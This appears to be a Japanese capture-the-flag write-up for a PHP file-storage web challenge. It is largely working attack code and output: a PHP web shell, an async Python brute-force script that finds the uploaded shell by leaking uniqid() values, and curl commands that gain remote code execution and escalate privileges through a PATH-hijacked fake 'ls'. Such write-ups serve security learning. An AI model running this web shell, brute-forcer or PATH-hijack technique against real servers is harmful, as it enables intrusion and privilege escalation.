# filestore:web:180pts
Yet another PHP file storage system, [yay](https://filestore.web.actf.co/)!  
[Source code](filestore.tar.gz)  

# Solution
リンクにアクセスすると以下のPHPソースが表示された。  
```php
 <?php
    if($_SERVER['REQUEST_METHOD'] == "POST"){
        if ($_FILES["f"]["size"] > 1000) {
            echo "file too large";
            return;
        }
    
        $i = uniqid();

        if (empty($_FILES["f"])){
            return;
        }

        if (move_uploaded_file($_FILES["f"]["tmp_name"], "./uploads/" . $i . "_" . hash('sha256', $_FILES["f"]["name"]) . "_" . $_FILES["f"]["name"])){
            echo "upload success";
        } else {
            echo "upload error";
        }
    } else {
        if (isset($_GET["f"])) {
            include "./uploads/" . $_GET["f"];
        }

        highlight_file("index.php");

        // this doesn't work, so I'm commenting it out 😛
        // system("/list_uploads");
    }
?>
```
任意のファイルがアップロード可能であり、指定したファイルを読み込むこともできるため一見するとRCE可能そうに見える。  
ただし`uniqid();`がファイル名の先頭に付加されており予測できないため、どのファイルを読み取ればよいかがわからない。  
もちろんコメントアウトされているので、アップロードファイル一覧を出力するであろう`system("/list_uploads");`も実行できない。  
このような場合、サーバログなどでRCEを達成する手法が知られているが、今回は非公開ではあるがサーバの設定なのか利用できないようだ。  
配布されたソースのDockerfileを見ると以下のようであった。  
```Dockerfile
FROM php:8.1.18-apache-bullseye

RUN groupadd -r admin && useradd -r -g admin admin
RUN groupadd -r ctf && useradd -r -g ctf ctf

RUN sed -i "s/Listen 80/Listen 8080/" /etc/apache2/ports.conf

RUN chmod -R 755 /etc/apache2 &&\
    chmod -R 755 /var/www/

COPY flag.txt /flag.txt
RUN chown admin:admin /flag.txt &&\
    chmod 440 /flag.txt

COPY make_abyss_entry /make_abyss_entry
RUN chown root:root /make_abyss_entry &&\
    chmod 111 /make_abyss_entry &&\
    chmod g+s /make_abyss_entry

COPY list_uploads /list_uploads
RUN chown admin:admin /list_uploads &&\
    chmod 111 /list_uploads &&\
    chmod g+s /list_uploads

COPY src /var/www/html

RUN mkdir /abyss &&\
    chown -R root:root /abyss &&\
    chmod -R 331 /abyss

RUN chown -R root:root /var/www/html &&\
    chmod -R 555 /var/www/html

RUN rm -rf /var/www/html/uploads

RUn mkdir /var/www/html/uploads &&\
    chmod -R 333 /var/www/html/uploads

RUN rm -f /bin/chmod /usr/bin/chmod /bin/chown /usr/bin/chown

USER ctf

EXPOSE 8080
```
自身は`ctf`ユーザで、`admin`のみが`/flag.txt`を読み取れるようだ。  
`root`で`/make_abyss_entry`を実行しているが、ローカルで試すと`/abyss`以下にランダムな名前のディレクトリを作成する振る舞いであった。  
つまり`/make_abyss_entry`で他競技者に見られないように自分だけのディレクトリを作成して`admin`にPrivileges Escalationしろということのようだ(さすがに`root`は問題が破壊できるので到達できないと予測)。  
いまだPHP部分を突破できていないものの、侵入した後のPEを考える。  
`admin`で`g+s`された`/list_uploads`がPHPで利用できないにもかかわらず存在するため、PEに利用すると考えられる。  
中身を軽くデコンパイルすると`system("ls /var/www/html/uploads");`を行っている。  
ここで`ls`が絶対パス指定でないため、PATHを切り替えることで偽の`ls`を実行させることができることに気づく。  
`cat /flag.txt`などと記述したものを、ファイル名`ls`として実行可能権限を付け、`/abyss`以下の自分だけのディレクトリに配置しておき、そこをPATHとしてやればよい。  
ただし、`/bin/chmod`などは削除されているため、後から偽の`ls`に実行権限を付加することができない。  
そこで、tar展開時に権限をローカルから引き継ぐ手法を利用する。  
以下のようにtarを作っておく(PHP部分を突破できた場合、WebShell経由でのRCEとなるため、base64で送信できるようにしておく)。  
```bash
mkdir satoki
echo 'cat /flag.txt' > satoki/ls
tar cvzfp a.tar.gz satoki
$ cat a.tar.gz | base64
H4sIAAAAAAAAA+3RTQoCMQyG4aw9RU/gJGNrz1MERRwQbASP74g/iAsHF0XE99lkkUI/8tXi+922
k5Z0lHO+TMtJn+edWIy99TFlXYiaaYoSUtNUN8fq5RCC1PEQ795N7X9UvfY/1IZ/TPZvy9f+oyUJ
2jDTw5/3vyoeuvVQNnM/+ezbaQAAAAAAAAAAAAAAAAB84gwp3cY1ACgAAA==
```
侵入後は以下の通りでPEできる(?????は`/make_abyss_entry`の結果)。  
```bash
/make_abyss_entry
cd /abyss/?????
echo -n 'H4sIAAAAAAAAA+3RTQoCMQyG4aw9RU/gJGNrz1MERRwQbASP74g/iAsHF0XE99lkkUI/8tXi+922k5Z0lHO+TMtJn+edWIy99TFlXYiaaYoSUtNUN8fq5RCC1PEQ795N7X9UvfY/1IZ/TPZvy9f+oyUJ2jDTw5/3vyoeuvVQNnM/+ezbaQAAAAAAAAAAAAAAAAB84gwp3cY1ACgAAA==' | base64 -d > a.tar.gz
tar xvzfp a.tar.gz
export PATH=/abyss/?????/satoki:/bin
/list_uploads
```
ここで、後回しにしていたPHP部分の突破を考える。  
ソースに怪しいファイルは存在しなかったため、正攻法で突破する必要がある。  
アップロード用のWebShellは以下のとおりsatoki.phpとして作っておく。  
```php
<?php
    echo "satoki";
    echo system($_GET["satoki"]);
?>
```
アップロードも問題なくできるようだ。  
```bash
$ curl https://filestore.web.actf.co -F f=@'satoki.php'
upload success
```
ファイル名を長くしてみることを思いつく。  
```bash
$ curl https://filestore.web.actf.co -F f=@'satoki.php;filename=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php'
<br />
<b>Warning</b>:  move_uploaded_file(./uploads/6445713e53178_4c92fdb99dcbb0073a26503b6f60335d1210f815f5272a4c2b80e0ed01f079fe_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php): Failed to open stream: File name too long in <b>/var/www/html/index.php</b> on line <b>14</b><br />
<br />
<b>Warning</b>:  move_uploaded_file(): Unable to move &quot;/tmp/phpH07YbE&quot; to &quot;./uploads/6445713e53178_4c92fdb99dcbb0073a26503b6f60335d1210f815f5272a4c2b80e0ed01f079fe_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php&quot; in <b>/var/www/html/index.php</b> on line <b>14</b><br />
upload error
```
エラーとなった。  
ここで、エラーからファイル名として`uniqid()`の結果がわかることに気づく。  
`uniqid()`は時間ベースなので、連続してファイルを送信すれば総当たり可能な範囲にWebShellを配置できる。  
以下のattack.pyで非同期で複数回ファイルを投げ、ある程度の範囲の`uniqid()`を総当たりする。  
```python
import re
import sys
import aiohttp
import asyncio
import requests
from aiohttp import FormData

URL = "https://filestore.web.actf.co/"

payload = open("satoki.php", "rb").read()

async def post(filename):
    async with aiohttp.ClientSession() as session:
        data = FormData()
        data.add_field("f", payload, filename=filename)
        async with session.post(URL, data=data) as response:
            return await response.text()

while True:
    try:
        loop = asyncio.get_event_loop()
        tasks = asyncio.gather(
            post(f"{'satoki'*30}.php"), 
            post("satoki.php"), 
            post("satoki.php"), 
            post("satoki.php"), 
            post(f"{'satoki'*30}.php"), 
        )
        res = loop.run_until_complete(tasks)

        start = int("0x" + re.search("uploads/([0-9a-f]*)_0d6fb", res[0]).group(1), 16)
        end = int("0x" + re.search("uploads/([0-9a-f]*)_0d6fb", res[-1]).group(1), 16)
        print(f"[{end - start}]")

        if -1 < end - start < 700:
            for i in range(end - start + 1):
                print(f"{i + 1}/{end - start + 1}")
                filename = f"{f'{hex(end - i)}'.replace('0x', '')}_5e0b2ce2b5586766a112f37e4ae49da5e9d7be72afaf1a29858ecc70ecc2f5be_satoki.php"
                try:
                    res = requests.get(f"https://filestore.web.actf.co?f={filename}").text
                except Exception as e:
                    print(f"ERROR: {e}")
                    continue
                if "No such file or directory" not in res:
                    print("Pwned!!!!!")
                    print(f"https://filestore.web.actf.co?f={filename}")
                    print(res)
                    sys.exit()
    except Exception as e:
        print(f"ERROR: {e}")
        continue
```
実行する。  
```bash
$ python attack.py
~~~
[8687]
[9270]
[74466]
[89384]
[134885]
[476]
1/477
2/477
3/477
~~~
197/477
198/477
199/477
Pwned!!!!!
https://filestore.web.actf.co?f=644581a9740ce_5e0b2ce2b5586766a112f37e4ae49da5e9d7be72afaf1a29858ecc70ecc2f5be_satoki.php
satoki<br />
<b>Warning</b>:  Undefined array key "satoki" in <b>/var/www/html/uploads/644581a9740ce_5e0b2ce2b5586766a112f37e4ae49da5e9d7be72afaf1a29858ecc70ecc2f5be_satoki.php</b> on line <b>3</b><br />
<br />
<b>Deprecated</b>:  system(): Passing null to parameter #1 ($command) of type string is deprecated in <b>/var/www/html/uploads/644581a9740ce_5e0b2ce2b5586766a112f37e4ae49da5e9d7be72afaf1a29858ecc70ecc2f5be_satoki.php</b> on line <b>3</b><br />
<br />
<b>Fatal error</b>:  Uncaught ValueError: system(): Argument #1 ($command) cannot be empty in /var/www/html/uploads/644581a9740ce_5e0b2ce2b5586766a112f37e4ae49da5e9d7be72afaf1a29858ecc70ecc2f5be_satoki.php:3
Stack trace:
#0 /var/www/html/uploads/644581a9740ce_5e0b2ce2b5586766a112f37e4ae49da5e9d7be72afaf1a29858ecc70ecc2f5be_satoki.php(3): system('')
#1 /var/www/html/index.php(21): include('/var/www/html/u...')
#2 {main}
  thrown in <b>/var/www/html/uploads/644581a9740ce_5e0b2ce2b5586766a112f37e4ae49da5e9d7be72afaf1a29858ecc70ecc2f5be_satoki.php</b> on line <b>3</b><br />
```
ヒットした。  
あとは用意してあったPEを行うだけである。  
以下の通り実行する。  
```bash
$ curl 'https://filestore.web.actf.co?f=644581a9740ce_5e0b2ce2b5586766a112f37e4ae49da5e9d7be72afaf1a29858ecc70ecc2f5be_satoki.php&satoki=%2Fmake_abyss_entry'
satokic921550691f3f89c6f2edccde0adf70bda3f66ce52bd57f2c92bce6e63df1c2f
c921550691f3f89c6f2edccde0adf70bda3f66ce52bd57f2c92bce6e63df1c2f<code>
~~~
$ curl 'https://filestore.web.actf.co?f=644581a9740ce_5e0b2ce2b5586766a112f37e4ae49da5e9d7be72afaf1a29858ecc70ecc2f5be_satoki.php&satoki=cd%20%2Fabyss%2Fc921550691f3f89c6f2edccde0adf70bda3f66ce52bd57f2c92bce6e63df1c2f%3B%20echo%20-n%20%27H4sIAAAAAAAAA%2B3RTQoCMQyG4aw9RU%2FgJGNrz1MERRwQbASP74g%2FiAsHF0XE99lkkUI%2F8tXi%2B922k5Z0lHO%2BTMtJn%2BedWIy99TFlXYiaaYoSUtNUN8fq5RCC1PEQ795N7X9UvfY%2F1IZ%2FTPZvy9f%2BoyUJ2jDTw5%2F3vyoeuvVQNnM%2F%2BezbaQAAAAAAAAAAAAAAAAB84gwp3cY1ACgAAA%3D%3D%27%20%7C%20base64%20-d%20%3E%20a.tar.gz%3B%20tar%20xvzfp%20a.tar.gz%3B%20export%20PATH%3D%2Fabyss%2Fc921550691f3f89c6f2edccde0adf70bda3f66ce52bd57f2c92bce6e63df1c2f%2Fsatoki%3A%2Fbin%3B%20%2Flist_uploads'
satokisatoki/
satoki/ls
actf{w4tch_y0ur_p4th_724248b559281824}actf{w4tch_y0ur_p4th_724248b559281824}<code>
~~~
```
flagが得られた。  

## actf{w4tch_y0ur_p4th_724248b559281824}